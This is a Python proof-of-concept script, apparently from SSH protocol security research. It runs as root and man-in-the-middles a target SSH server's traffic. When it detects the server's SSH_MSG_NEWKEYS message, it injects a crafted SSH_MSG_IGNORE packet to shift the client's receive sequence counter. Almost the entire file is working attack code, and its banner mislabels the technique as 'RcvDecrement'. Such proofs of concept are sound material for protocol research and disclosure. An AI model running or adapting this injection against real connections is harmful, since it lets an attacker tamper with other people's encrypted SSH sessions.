#!/usr/bin/python3
import sys
from binascii import unhexlify
from common import is_root, contains_newkeys, run_tcp_mitm

#####################################################################################
## Proof of Concept for the RcvIncrement technique                                 ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

INTERFACE='eth0'
TARGET_PORT=22
TARGET_IP = '192.168.22.10'

rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
def inject_rcvincrement(in_socket, out_socket):
    try:
        while True:
            data = in_socket.recv(4096)
            if contains_newkeys(data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                print("[+] Injecting SSH_MSG_IGNORE packets to increment C.Rcv!")
                out_socket.send(rogue_msg_ignore)
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

if __name__ == '__main__':
    if not is_root():
        print("[!] Script must be run as root!")
        sys.exit(1)

    print("--- Proof of Concept for RcvDecrement technique ---")
    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match (C.Rcv = S.Snd + 1).")
    run_tcp_mitm(TARGET_IP, TARGET_PORT, forward_server_to_client=inject_rcvincrement)
